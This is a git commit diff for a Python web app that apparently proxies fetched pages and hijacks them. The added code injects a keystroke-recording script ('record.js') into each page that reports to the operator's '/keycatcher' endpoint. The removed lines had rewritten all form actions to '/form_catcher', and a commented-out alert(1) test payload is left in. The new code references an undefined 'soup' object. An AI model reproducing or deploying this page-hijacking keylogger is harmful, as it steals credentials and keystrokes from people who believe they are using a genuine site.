5972acaef6785b45104fb724deacaf960c1e81d2
Jonathan Metzman <jon.metzman@gmail.com>
2015-01-24 18:50:25 -0500

    Add js code to dataurl

--- app.py
+++ app.py
@@ -25,10 +25,31 @@ def fetch_page():
     modified_text = hijack_page(text)
     return modified_text
 
-def hijack_page(text):
-    text = re.sub(r'action\=\".*\" ', 'action="/form_catcher" ', text)
-    text = re.sub(r'action\=\".*\">', 'action="/form_catcher">', text)
-    return text
+
+def hijack_page(text, user_id, host_url, no_js=False):
+    # # hack to replace form actions with our own
+    # text = re.sub(r'action\=\".*\" ', 'action="/form_catcher" ', text)
+    # text = re.sub(r'action\=\".*\">', 'action="/form_catcher">', text)
+    if no_js:
+        soup.script.replaceWith('')
+    fp = open('static/record.js')
+    script_body = fp.read()
+    fp.close()
+    post_url = ''.join([host_url, 'keycatcher', '/'])
+    script_tag = '<script src="https://code.jquery.com/jquery-2.1.3.min.js"></script><script>var user_id="{0}", post_url="{1}"; {2}</script>'.format(user_id, post_url, script_body)
+    ind = text.index('</body>')
+    new_page = insert(text, script_tag, ind)
+
+    # script_tag2 = '<script>alert(1)</script>'
+    # ind2 = new_page.index('</head>')
+    # new_page = insert(new_page, script_tag2, ind2)
+    return new_page
+
+def insert(string, substring, index):
+    str_beginning = string[:index]
+    str_end = string[index:]
+    new_string = ''.join([str_beginning, substring, str_end])
+    return new_string
 
 if __name__ == "__main__":
     app.run(debug=True)
